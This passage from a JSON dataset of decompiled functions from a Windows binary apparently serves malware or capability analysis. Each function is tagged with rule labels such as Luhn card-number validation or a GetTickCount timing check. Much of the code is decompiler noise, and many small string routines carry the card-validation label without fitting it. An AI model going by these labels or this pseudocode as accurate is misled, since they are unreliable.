= *puVar26 + cVar8;\n                    *puVar26 = *puVar26 + cVar8;\n                    *puVar26 = *puVar26 + cVar8;\n                    *puVar26 = *puVar26 + cVar8;\n                    *puVar26 = *puVar26 + cVar8;\n                    *puVar26 = *puVar26 + cVar8;\n                    *puVar26 = *puVar26 + cVar8;\n                    *puVar26 = *puVar26 + cVar8;\n                    *puVar26 = *puVar26 + cVar8;\n                    *(iVar46 + 0x46) = *(iVar46 + 0x46);\n                    *ppcVar17 = *ppcVar17 + puVar26;\n                    puVar14 = puVar26 & 0xffffff00 | cVar8 + 8;\n                    iVar46 = iVar46 + 1;\n                    puVar50 = puVar50 + 1;\n                }\n                *puVar26 = *puVar26 & puVar26;\n                *puVar26 = *puVar26 + cVar8;\n                *puVar26 = *puVar26 + cVar8;\n                *puVar26 = *puVar26 + cVar8;\n                *puVar26 = *puVar26 + cVar8;\n                *puVar26 = *puVar26 + cVar8;\n                pcVar44[0xa5] = pcVar44[0xa5] + cVar7;\n                *puVar26 = *puVar26 + cVar8;\n                pcVar44[0xfce09f] = pcVar44[0xfce09f] + cVar8;\n                *puVar26 = *puVar26 + cVar8;\n                *(puVar26 + 0x7e) = *(puVar26 + 0x7e) + cVar8;\n                *puVar26 = *puVar26 + cVar8;\n                *(puVar26 + -0x3efffffd) = *(puVar26 + -0x3efffffd) + (pcVar44 >> 8);\n                *puVar26 = *puVar26 + cVar8;\n                *puVar26 = *puVar26 + cVar8;\n                *puVar26 = *puVar26 + cVar8;\n                *puVar26 = *puVar26 + cVar8;\n                *puVar26 = *puVar26 + cVar8;\n                *puVar26 = *puVar26 + cVar8;\n                *puVar26 = *puVar26 + cVar8;\n                *puVar26 = *puVar26 + cVar8;\n                *puVar26 = *puVar26 + cVar8;\n                *puVar26 = *puVar26 + cVar8;\n                *puVar26 = *puVar26 + cVar8;\n                *puVar26 = *puVar26 + cVar8;\n                pcVar44 = puVar26 + 1;\n                *pcVar44 = *pcVar44 + '\\x01';\n                *0x1aa2e4 = pcVar44;\n                *pcVar44 = *pcVar44 + *0x1aa2e4;\n                *pcVar44 = *pcVar44 + *0x1aa2e4;\n                cVar8 = ppcVar17 >> 8;\n                *(iVar46 + -0x3efffffc) = *(iVar46 + -0x3efffffc) + cVar8;\n                *0x20a3da = pcVar44;\n                *pcVar44 = *pcVar44 + *0x1aa2e4;\n                *pcVar44 = *pcVar44 + *0x1aa2e4;\n                *pcVar44 = *pcVar44 + *0x1aa2e4;\n                *pcVar44 = *pcVar44 + *0x1aa2e4;\n                *pcVar44 = *pcVar44 + *0x1aa2e4;\n                *pcVar44 = *pcVar44 + *0x1aa2e4;\n                *pcVar44 = *pcVar44 + *0x1aa2e4;\n                *pcVar44 = *pcVar44 + *0x1aa2e4;\n                *pcVar44 = *pcVar44 + *0x1aa2e4;\n                *pcVar44 = *pcVar44 + *0x1aa2e4;\n                *pcVar44 = *pcVar44 + *0x1aa2e4;\n                *pcVar44 = *pcVar44 + *0x1aa2e4;\n                *pcVar44 = *pcVar44 + '\\x01';\n                *pcVar44 = *pcVar44 + *0x1aa2e4;\n                *pcVar44 = *pcVar44 + *0x1aa2e4;\n                puVar50[-0x30fffffb] = puVar50[-0x30fffffb] + cVar8;\n                in(0xa2);\n                puVar38 = puVar37 + -4;\n                *(puVar37 + -4) = 0x46ce91;\n                pcVar44 = func_0x00472a33();\n                cVar8 = pcVar44;\n                *pcVar44 = *pcVar44 + cVar8;\n                *pcVar44 = *pcVar44 + cVar8;\n                *pcVar44 = *pcVar44 + cVar8;\n                *pcVar44 = *pcVar44 + cVar8;\n                *pcVar44 = *pcVar44 + cVar8;\n                *pcVar44 = *pcVar44 + cVar8;\n                *pcVar44 = *pcVar44 + cVar8;\n                *(extraout_ECX_01 + 0xfe) = *(extraout_ECX_01 + 0xfe) + cVar8;\n                *pcVar44 = *pcVar44 + cVar8;\n                pcVar44[0x7e] = pcVar44[0x7e] + cVar8;\n                puVar14 = *0xfe;\n                *(extraout_ECX_01 + 5) = *(extraout_ECX_01 + 5) + extraout_DL;\n                uVar53 = puVar14;\n                *puVar14 = *puVar14 + uVar53;\n                *(puVar38 + -4) = extraout_ECX_01;\n                *puVar14 = *puVar14 & uVar53;\n                uVar18 = *(puVar38 + -4);\n                uVar53 = uVar53 ^ *puVar14;\n                pcVar44 = puVar14 & 0xffffff00 | uVar53;\n                *pcVar44 = *pcVar44 + uVar53;\n                *pcVar44 = *pcVar44 + uVar53;\n                *pcVar44 = *pcVar44 + uVar53;\n                *pcVar44 = *pcVar44 + uVar53;\n                *pcVar44 = *pcVar44 + uVar53;\n                *pcVar44 = *pcVar44 + uVar53;\n                *pcVar44 = *pcVar44 + uVar53;\n                *pcVar44 = *pcVar44 + uVar53;\n                *pcVar44 = *pcVar44 + uVar53;\n                *(puVar50 + -0x7d) = *(puVar50 + -0x7d) ^ uVar18;\n                *pcVar44 = *pcVar44 + '\\x01';\n                *pcVar44 = *pcVar44 + uVar53;\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x7:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x8:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x9:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0xa:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0xb:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            piVar13 = &fcn.0040b090::var_8h;\n            puVar58 = &fcn.0040b090::var_4h;\n            in_stack_ffffffc8 = NULL;\n            uStackY60 = 0x40b247;\n            uVar57 = fcn.0042d83d(0, puVar58, piVar13);\n            piVar51 = piVar51 + 1;\n            puVar27 = extraout_ECX_00;\n        } while (uVar57 != 0);\n    }\n    return;\n}\n",
        "token_count": 137919
    },
    "0040b540": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040b540(int32_t *arg_8h, uint *arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    uint32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    \n    if (arg_10h == 0) {\n        return in_EAX & 0xffffff00;\n    }\n    iVar1 = (**0x469094)(arg_10h, arg_14h, 0x40000001, 0, arg_ch);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    uVar2 = (**0x4692b4)(0, *arg_ch);\n    iVar1 = (**0x46923c)(uVar2);\n    *arg_8h = iVar1;\n    if (iVar1 == 0) {\n        return 0;\n    }\n    fcn.0042acb0(iVar1, 0, *arg_ch);\n    uVar3 = (**0x469094)(arg_10h, arg_14h, 0x40000001, *arg_8h, arg_ch);\n    return uVar3 & 0xffffff00 | uVar3 != 0;\n}\n",
        "token_count": 283
    },
    "0040b5c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b5c0(int32_t arg_8h)\n\n{\n    *0x4586a4 = *0x4586a4 + arg_8h;\n    return;\n}\n",
        "token_count": 48
    },
    "0040b730": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040b730(void)\n\n{\n    int32_t iVar1;\n    uint *arg_8h;\n    uint var_210h;\n    uint var_20ch;\n    uchar var_208h;\n    uint var_207h;\n    uint var_108h;\n    uint32_t var_4h;\n    \n    var_4h = *0x456900 ^ &stack0xfffffffc;\n    var_210h = 0xff;\n    var_208h = 0;\n    fcn.0042acb0(&var_207h, 0, 0xfe);\n    iVar1 = (**0x469180)(0x80000001, *0x4580f8, 0, 0x20119, &var_20ch);\n    if (iVar1 == 0) {\n        (**0x469164)(var_20ch, *0x458488, 0, 0, &var_208h, &var_210h);\n    }\n    (**0x469208)(var_20ch);\n    fcn.0042acb0(&var_108h, 0, 0x104);\n    (**0x469258)(&var_108h, &var_208h);\n    arg_8h = &var_108h;\n    (**0x469258)(arg_8h, 0x446e68);\n    fcn.0040b5d0(&var_208h, *0x457df0);\n    fcn.0040b5d0(&var_108h, *0x458084);\n    fcn.0040b5d0(&var_108h, *0x457d94);\n    fcn.0040b5d0(&var_108h, *0x458544);\n    fcn.0040b5d0(&var_108h, *0x4580e4);\n    fcn.0040b5d0(&var_108h, *0x4582e8);\n    fcn.0042ad2a(arg_8h);\n    return;\n}\n",
        "token_count": 457
    },
    "0040b890": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040b890(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    uVar1 = fcn.0041f640(*0x458414);\n    iVar2 = fcn.0042c1a0(uVar1);\n    if (iVar2 == 0) {\n        uVar1 = fcn.0041f7a0(*0x45857c);\n        iVar2 = fcn.0042c1a0(uVar1);\n        if (iVar2 == 0) {\n            (**0x4691bc)(0);\n        }\n    }\n    return;\n}\n",
        "token_count": 137
    },
    "0040b910": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040b910(char *arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t arg_8h_00;\n    int32_t iVar2;\n    uint *in_ECX;\n    uint *puVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint var_4h;\n    \n    if ((arg_10h != 0) || (in_ECX[4] <= arg_ch && arg_ch != in_ECX[4])) {\n        if ((arg_ch < in_ECX[4]) && (uVar4 = in_ECX[4] - arg_ch,  arg_10h <= uVar4)) {\n            iVar5 = uVar4 + (1 - arg_10h);\n            puVar3 = in_ECX;\n            if (0xf < in_ECX[5]) {\n                puVar3 = *in_ECX;\n            }\n            iVar1 = puVar3 + arg_ch;\n            arg_8h_00 = fcn.0042d790(iVar1, *arg_8h, iVar5);\n            while (arg_8h_00 != 0) {\n                iVar2 = fcn.0042c233(arg_8h_00, arg_8h, arg_10h);\n                if (iVar2 == 0) {\n                    if (0xf < in_ECX[5]) {\n                        in_ECX = *in_ECX;\n                    }\n                    return arg_8h_00 - in_ECX;\n                }\n                iVar5 = iVar5 + -1 + (iVar1 - arg_8h_00);\n                iVar1 = arg_8h_00 + 1;\n                arg_8h_00 = fcn.0042d790(iVar1, *arg_8h, iVar5);\n            }\n        }\n        arg_ch = 0xffffffff;\n    }\n    return arg_ch;\n}\n",
        "token_count": 433
    },
    "0040b9c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040b9c0(uint arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint *in_ECX;\n    char *pcVar5;\n    \n    uVar1 = in_ECX[4];\n    if (arg_ch < uVar1) {\n        puVar2 = in_ECX;\n        if (0xf < in_ECX[5]) {\n            puVar2 = *in_ECX;\n        }\n        puVar3 = in_ECX;\n        if (0xf < in_ECX[5]) {\n            puVar3 = *in_ECX;\n        }\n        for (pcVar5 = puVar3 + arg_ch; pcVar5 < uVar1 + puVar2; pcVar5 = pcVar5 + 1) {\n            iVar4 = fcn.0042d790(arg_8h, *pcVar5, arg_10h);\n            if (iVar4 == 0) {\n                if (0xf < in_ECX[5]) {\n                    in_ECX = *in_ECX;\n                }\n                return pcVar5 - in_ECX;\n            }\n        }\n    }\n    return -1;\n}\n",
        "token_count": 289
    },
    "0040ba30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040ba30(uint arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    uint *in_ECX;\n    char *pcVar5;\n    uint var_4h;\n    \n    uVar1 = in_ECX[4];\n    if (uVar1 != 0) {\n        if (uVar1 <= arg_ch) {\n            arg_ch = uVar1 - 1;\n        }\n        puVar2 = in_ECX;\n        if (0xf < in_ECX[5]) {\n            puVar2 = *in_ECX;\n        }\n        pcVar5 = puVar2 + arg_ch;\n        iVar3 = fcn.0042d790(arg_8h, *pcVar5, arg_10h);\n        while( true ) {\n            if (iVar3 == 0) {\n                if (0xf < in_ECX[5]) {\n                    in_ECX = *in_ECX;\n                }\n                return pcVar5 - in_ECX;\n            }\n            pcVar4 = fcn.00405a60();\n            if (pcVar5 == pcVar4) break;\n            pcVar4 = pcVar5 + -1;\n            pcVar5 = pcVar5 + -1;\n            iVar3 = fcn.0042d790(arg_8h, *pcVar4, arg_10h);\n        }\n    }\n    return -1;\n}\n",
        "token_count": 340
    },
    "0040bac0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040bac0(uint *param_1)\n\n{\n    if (7 < param_1[5]) {\n        fcn.0042ac49(*param_1);\n    }\n    param_1[5] = 7;\n    param_1[4] = 0;\n    *param_1 = 0;\n    return;\n}\n",
        "token_count": 80
    },
    "0040baf0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040baf0(int32_t **arg_8h, uint32_t arg_ch)\n\n{\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    int32_t **ppiVar3;\n    int32_t **in_ECX;\n    ulong uVar4;\n    \n    if (arg_8h != NULL) {\n        piVar2 = in_ECX[5];\n        ppiVar1 = in_ECX;\n        if (0xf < piVar2) {\n            ppiVar1 = *in_ECX;\n        }\n        if (ppiVar1 <= arg_8h) {\n            ppiVar1 = in_ECX;\n            if (0xf < piVar2) {\n                ppiVar1 = *in_ECX;\n            }\n            if (arg_8h < in_ECX[4] + ppiVar1) {\n                if (0xf < piVar2) {\n                    fcn.00405dc0(in_ECX, arg_8h - *in_ECX, arg_ch);\n                    return;\n                }\n                fcn.00405dc0(in_ECX, arg_8h - in_ECX, arg_ch);\n                return;\n            }\n        }\n    }\n    piVar2 = in_ECX[4];\n    ppiVar1 = arg_8h;\n    if (-piVar2 - 1U <= arg_ch) {\n        uVar4 = fcn.0042a14e(0x4453fc);\n        ppiVar1 = uVar4 >> 0x20;\n        piVar2 = uVar4;\n    }\n    uVar4 = CONCAT44(ppiVar1, piVar2);\n    if (arg_ch != 0) {\n        piVar2 = piVar2 + arg_ch;\n        if (piVar2 == 0xffffffff) {\n            uVar4 = fcn.0042a14e(0x4453fc);\n        }\n        ppiVar1 = uVar4 >> 0x20;\n        if (in_ECX[5] < piVar2) {\n            fcn.00405b70(piVar2, uVar4);\n            ppiVar1 = arg_8h;\n            if (piVar2 == NULL) {\n                return;\n            }\n        }\n        else if (piVar2 == NULL) {\n            in_ECX[4] = NULL;\n            if (0xf < in_ECX[5]) {\n                **in_ECX = 0;\n                return;\n            }\n            *in_ECX = 0;\n            return;\n        }\n        ppiVar3 = in_ECX;\n        if (0xf < in_ECX[5]) {\n            ppiVar3 = *in_ECX;\n        }\n        fcn.0042af40(in_ECX[4] + ppiVar3, ppiVar1, arg_ch);\n        in_ECX[4] = piVar2;\n        if (0xf < in_ECX[5]) {\n            *(*in_ECX + piVar2) = 0;\n            return;\n        }\n        *(in_ECX + piVar2) = 0;\n    }\n    return;\n}\n",
        "token_count": 687
    },
    "0040be30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.0040be30(uchar *arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    *(arg_8h + 0x14) = 0xf;\n    *(arg_8h + 0x10) = 0;\n    *arg_8h = 0;\n    arg_ch = fcn.0042b420(0x446e74);\n    fcn.00406270(0x446e74, arg_ch);\n    return arg_8h;\n}\n",
        "token_count": 120
    },
    "0040be70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.0040be70(uchar *arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    *(arg_8h + 0x14) = 0xf;\n    *(arg_8h + 0x10) = 0;\n    *arg_8h = 0;\n    arg_ch = fcn.0042b420(0x446e78);\n    fcn.00406270(0x446e78, arg_ch);\n    return arg_8h;\n}\n",
        "token_count": 120
    },
    "0040beb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.0040beb0(uchar *arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    *(arg_8h + 0x14) = 0xf;\n    *(arg_8h + 0x10) = 0;\n    *arg_8h = 0;\n    arg_ch = fcn.0042b420(0x446e9c);\n    fcn.00406270(0x446e9c, arg_ch);\n    return arg_8h;\n}\n",
        "token_count": 122
    },
    "0040bef0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.0040bef0(uchar *arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    *(arg_8h + 0x14) = 0xf;\n    *(arg_8h + 0x10) = 0;\n    *arg_8h = 0;\n    arg_ch = fcn.0042b420(0x446eb4);\n    fcn.00406270(0x446eb4, arg_ch);\n    return arg_8h;\n}\n",
        "token_count": 120
    },
    "0040bf30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.0040bf30(uchar *arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    *(arg_8h + 0x14) = 0xf;\n    *(arg_8h + 0x10) = 0;\n    *arg_8h = 0;\n    arg_ch = fcn.0042b420(0x446f3c);\n    fcn.00406270(0x446f3c, arg_ch);\n    return arg_8h;\n}\n",
        "token_count": 122
    },
    "0040bf70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.0040bf70(uchar *arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    *(arg_8h + 0x14) = 0xf;\n    *(arg_8h + 0x10) = 0;\n    *arg_8h = 0;\n    arg_ch = fcn.0042b420(0x446ec0);\n    fcn.00406270(0x446ec0, arg_ch);\n    return arg_8h;\n}\n",
        "token_count": 120
    },
    "0040bfb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.0040bfb0(uchar *arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    *(arg_8h + 0x14) = 0xf;\n    *(arg_8h + 0x10) = 0;\n    *arg_8h = 0;\n    arg_ch = fcn.0042b420(0x446ed0);\n    fcn.00406270(0x446ed0, arg_ch);\n    return arg_8h;\n}\n",
        "token_count": 121
    },
    "0040bff0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.0040bff0(uchar *arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    *(arg_8h + 0x14) = 0xf;\n    *(arg_8h + 0x10) = 0;\n    *arg_8h = 0;\n    arg_ch = fcn.0042b420(0x4453cc);\n    fcn.00406270(0x4453cc, arg_ch);\n    return arg_8h;\n}\n",
        "token_count": 120
    },
    "0040c030": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.0040c030(uchar *arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    *(arg_8h + 0x14) = 0xf;\n    *(arg_8h + 0x10) = 0;\n    *arg_8h = 0;\n    arg_ch = fcn.0042b420(0x446f74);\n    fcn.00406270(0x446f74, arg_ch);\n    return arg_8h;\n}\n",
        "token_count": 120
    },
    "0040c9b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0040c9b0(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint noname_21, uint noname_22, uint noname_23, uint noname_24, uint noname_25, \n            uint noname_26, uint noname_27, uint noname_28, uint noname_29, uint noname_30, uint noname_31, \n            uint noname_32, uint noname_33, uint noname_34, uint noname_35, uint noname_36, uint noname_37, \n            uint noname_38, uint noname_39, uint noname_40, uint noname_41, uint noname_42, uint noname_43, \n            uint noname_44, uint noname_45, uint noname_46, uint noname_47, uint noname_48, uint noname_49, \n            uint noname_50, uint noname_51, uint noname_52, uint noname_53, uint noname_54, uint noname_55, \n            uint noname_56, uint noname_57, uint noname_58, uint noname_59, uint noname_60, uint noname_61, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    uchar auStackY8008 [244];\n    uint var_1f44h;\n    uint var_1b5ch_2;\n    uint var_1b5ch;\n    uint var_1774h_2;\n    uint var_1774h;\n    uint var_138ch_2;\n    uchar auStackY5008 [244];\n    uint var_138ch;\n    uint var_fa4h_2;\n    uint var_fa4h_3;\n    uint var_fa4h;\n    uint var_bbch_2;\n    uint var_bbch;\n    uint var_7d4h_2;\n    uint var_7d4h_3;\n    uint var_7d4h;\n    uint var_3ech_2;\n    uchar auStackY1008 [244];\n    uint var_3ech;\n    uint uStackY308;\n    uchar *puStackY304;\n    uint uStackY300;\n    uint uStackY296;\n    uchar *puStackY292;\n    uint uStackY288;\n    uint uStackY284;\n    uchar *puStackY280;\n    uint uStackY276;\n    uint uStackY272;\n    uint *arg_8h;\n    uint32_t in_stack_fffffefc;\n    uint *in_stack_ffffff00;\n    uint in_stack_ffffff04;\n    uint32_t in_stack_ffffff08;\n    uint in_stack_ffffff0c;\n    uint in_stack_ffffff10;\n    uint arg_24h;\n    uint in_stack_ffffff14;\n    uint uVar2;\n    uint uVar3;\n    uchar *arg_8h_00;\n    uint var_4h_2;\n    \n    fcn.0042ae40();\n    fcn.0042acb0();\n    fcn.0042acb0();\n    fcn.0042acb0();\n    fcn.0042acb0();\n    fcn.0042acb0();\n    fcn.0042acb0();\n    fcn.0042acb0();\n    fcn.0042acb0();\n    fcn.0042acb0();\n    (**0x469258)();\n    (**0x469258)();\n    (**0x469258)();\n    (**0x469258)();\n    (**0x469258)();\n    (**0x469258)();\n    (**0x469258)();\n    (**0x469258)();\n    (**0x469258)();\n    (**0x469258)();\n    (**0x469258)();\n    (**0x469258)();\n    (**0x469258)();\n    (**0x469258)();\n    (**0x469258)();\n    (**0x469258)();\n    (**0x469258)();\n    (**0x469258)();\n    (**0x469258)();\n    (**0x469258)();\n    (**0x469258)();\n    (**0x469258)();\n    (**0x469258)();\n    (**0x469258)();\n    (**0x469258)();\n    iVar1 = fcn.00420f90(&stack0xfffffc10);\n    if (iVar1 != 0) {\n        uVar3 = 0xf;\n        uVar2 = 0;\n        in_stack_ffffff08 = in_stack_ffffff08 & 0xffffff00;\n        in_stack_ffffff04 = fcn.0042b420();\n        in_stack_ffffff00 = &fcn.0040c9b0::var_fa4h_3;\n        fcn.00406270(in_stack_ffffff00, in_stack_ffffff04);\n        in_stack_fffffefc = 0x40cca9;\n        fcn.0040c790(in_stack_ffffff00, in_stack_ffffff04, in_stack_ffffff08, in_stack_ffffff0c, in_stack_ffffff10, \n                     in_stack_ffffff14, uVar2, uVar3);\n    }\n    arg_8h_00 = 0x40ccbe;\n    iVar1 = fcn.00420f90(&fcn.0040c9b0::var_7d4h_3);\n    if (iVar1 != 0) {\n        arg_8h_00 = &stack0xffffec70;\n        arg_24h = 0xf;\n        uVar3 = 0;\n        in_stack_fffffefc = in_stack_fffffefc & 0xffffff00;\n        uVar2 = fcn.0042b420();\n        arg_8h = &fcn.0040c9b0::var_fa4h_3;\n        uStackY272 = 0x40cd0a;\n        fcn.00406270(arg_8h, uVar2);\n        uStackY272 = 0x40cd0f;\n        fcn.0040c790(arg_8h, uVar2, in_stack_fffffefc, in_stack_ffffff00, in_stack_ffffff04, in_stack_ffffff08, uVar3, \n                     arg_24h);\n    }\n    fcn.0042acb0();\n    fcn.0042acb0();\n    uStackY272 = 0x40cd4b;\n    fcn.0042acb0();\n    uStackY272 = 1000;\n    puStackY280 = &stack0xffffe0b8;\n    uStackY276 = 0;\n    uStackY284 = 0x40cd5e;\n    fcn.0042acb0();\n    uStackY284 = 1000;\n    puStackY292 = &stack0xffffec70;\n    uStackY288 = 0;\n    uStackY296 = 0x40cd71;\n    fcn.0042acb0();\n    uStackY296 = 1000;\n    puStackY304 = &stack0xfffffc10;\n    uStackY300 = 0;\n    uStackY308 = 0x40cd84;\n    fcn.0042acb0();\n    fcn.0042acb0();\n    fcn.0042acb0();\n    uStackY272 = 0x40cdc0;\n    fcn.0042acb0();\n    fcn.0042ad2a(arg_8h_00);\n    return;\n}\n",
        "token_count": 1751
    },
    "0040cde0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_7d4h\n\nvoid fcn.0040cde0(void)\n\n{\n    uint noname_5;\n    uint *noname_2;\n    uint *noname_3;\n    uint *noname_4;\n    uint *noname_6;\n    uint noname_7;\n    uint var_7d4h;\n    uint in_stack_fffff82c;\n    uint in_stack_fffff830;\n    uint in_stack_fffff834;\n    uint in_stack_fffff838;\n    uint in_stack_fffff83c;\n    uint in_stack_fffff840;\n    uint in_stack_fffff844;\n    uint in_stack_fffff848;\n    uint in_stack_fffff84c;\n    uint in_stack_fffff850;\n    uint in_stack_fffff854;\n    uint in_stack_fffff858;\n    uint in_stack_fffff85c;\n    uint in_stack_fffff860;\n    uint in_stack_fffff864;\n    uint in_stack_fffff868;\n    uint in_stack_fffff86c;\n    uint in_stack_fffff870;\n    uint in_stack_fffff874;\n    uint in_stack_fffff878;\n    uint in_stack_fffff87c;\n    uint in_stack_fffff880;\n    uint in_stack_fffff884;\n    uint in_stack_fffff888;\n    uint in_stack_fffff88c;\n    uint in_stack_fffff890;\n    uint in_stack_fffff894;\n    uint in_stack_fffff898;\n    uint in_stack_fffff89c;\n    uint in_stack_fffff8a0;\n    uint in_stack_fffff8a4;\n    uint in_stack_fffff8a8;\n    uint in_stack_fffff8ac;\n    uint in_stack_fffff8b0;\n    uint in_stack_fffff8b4;\n    uint in_stack_fffff8b8;\n    uint in_stack_fffff8bc;\n    uint in_stack_fffff8c0;\n    uint in_stack_fffff8c4;\n    uint in_stack_fffff8c8;\n    uint in_stack_fffff8cc;\n    uint in_stack_fffff8d0;\n    uint in_stack_fffff8d4;\n    uint in_stack_fffff8d8;\n    uint in_stack_fffff8dc;\n    uint in_stack_fffff8e0;\n    uint in_stack_fffff8e4;\n    uint in_stack_fffff8e8;\n    uint in_stack_fffff8ec;\n    uint in_stack_fffff8f0;\n    uint in_stack_fffff8f4;\n    uint in_stack_fffff8f8;\n    uint in_stack_fffff8fc;\n    uint in_stack_fffff900;\n    uint var_3ech;\n    uint32_t var_4h;\n    \n    var_4h = *0x456900 ^ &stack0xfffffffc;\n    fcn.0042acb0(&var_3ech, 0, 1000);\n    fcn.0042acb0(&var_7d4h, 0, 1000);\n    noname_6 = &var_7d4h;\n    noname_7 = *0x458098;\n    (**0x469258)();\n    noname_5 = fcn.00421020(0x1a);\n    noname_4 = &var_3ech;\n    (**0x469258)();\n    noname_3 = &var_7d4h;\n    noname_2 = &var_3ech;\n    (**0x469258)();\n    fcn.0040c9b0(0x4453cc, &var_3ech, noname_2, noname_3, noname_4, noname_5, noname_6, noname_7, var_7d4h, \n                 in_stack_fffff82c, in_stack_fffff830, in_stack_fffff834, in_stack_fffff838, in_stack_fffff83c, \n                 in_stack_fffff840, in_stack_fffff844, in_stack_fffff848, in_stack_fffff84c, in_stack_fffff850, \n                 in_stack_fffff854, in_stack_fffff858, in_stack_fffff85c, in_stack_fffff860, in_stack_fffff864, \n                 in_stack_fffff868, in_stack_fffff86c, in_stack_fffff870, in_stack_fffff874, in_stack_fffff878, \n                 in_stack_fffff87c, in_stack_fffff880, in_stack_fffff884, in_stack_fffff888, in_stack_fffff88c, \n                 in_stack_fffff890, in_stack_fffff894, in_stack_fffff898, in_stack_fffff89c, in_stack_fffff8a0, \n                 in_stack_fffff8a4, in_stack_fffff8a8, in_stack_fffff8ac, in_stack_fffff8b0, in_stack_fffff8b4, \n                 in_stack_fffff8b8, in_stack_fffff8bc, in_stack_fffff8c0, in_stack_fffff8c4, in_stack_fffff8c8, \n                 in_stack_fffff8cc, in_stack_fffff8d0, in_stack_fffff8d4, in_stack_fffff8d8, in_stack_fffff8dc, \n                 in_stack_fffff8e0, in_stack_fffff8e4, in_stack_fffff8e8, in_stack_fffff8ec, in_stack_fffff8f0, \n                 